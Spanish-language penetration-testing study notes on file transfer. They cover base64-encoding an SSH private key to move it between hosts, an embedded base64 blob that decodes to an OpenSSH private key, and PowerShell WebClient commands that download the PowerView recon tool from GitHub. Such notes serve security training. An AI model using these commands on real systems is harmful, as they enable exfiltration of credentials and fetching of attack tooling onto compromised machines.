# TRANSFERENCIA DE FICHEROS
Tenemos muchos escenarios donde utilizaremos esto y debemos entenderlo.

Entenderemos diferentes formas de transferir archivos y como las redes operar y nos pueden ayudar durante nuestro paso.

Debemos entender que muchos sistemas operativos o adminstradores nos pueden bloquear depende lo que hagamos.

Aprenderemos tecnicas de Windows y linux.

## INTRODUCCION

EL sistema operativo windows tiene muchas versiones y difernetes utilidades para hacer operaciones de transferencia

Normalmente un ataque sigue estos pasos: 
1- Link malicioso
2- Execucion de codigo 
3 - Descargar de codigo malicioso

## POWERSHELL BASE64 ENCODE & DECODE

Dependiendo del tamaño del archivo a transferir, necesitarmeos metodos para transferir.
SI nosotros tenemos acceso a una teminal podremos cifrar un archivo en base64, copiando el contenido y haciendo la operacion reversa.

Un uso esencial es utilizar "md5sum" un programa que verifica hashesh "checksums" y es compacta y ligera
```
md5sum id_rsa
```
Para cifrar
```
cat id_rsa |base64 -w 0;echo
```
En caso de querer hacerlo en Windows
```
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
O coger el hash
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## POWERSHELL DESCARGAS DE WEB
Las compañias utilizan "HTTP" y "HTTPS" para el trafico en red y utilizan un "firewall".


Powershell nos da muchas opciones para descargar ficheros desde aqui
```
Method	Description
OpenRead	| Returns the data from a resource as a Stream.
OpenReadAsync	| Returns the data from a resource without blocking the calling thread.
DownloadData	| Downloads data from a resource and returns a Byte array.
DownloadDataAsync	| Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	| Downloads data from a resource to a local file.
DownloadFileAsync	| Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	| Downloads a String from a resource and returns a String.
DownloadStringAsync	| Downloads a String from a resource without blocking the calling thread.
```
Vamos a ver ejemplos

```
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```
```
# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```


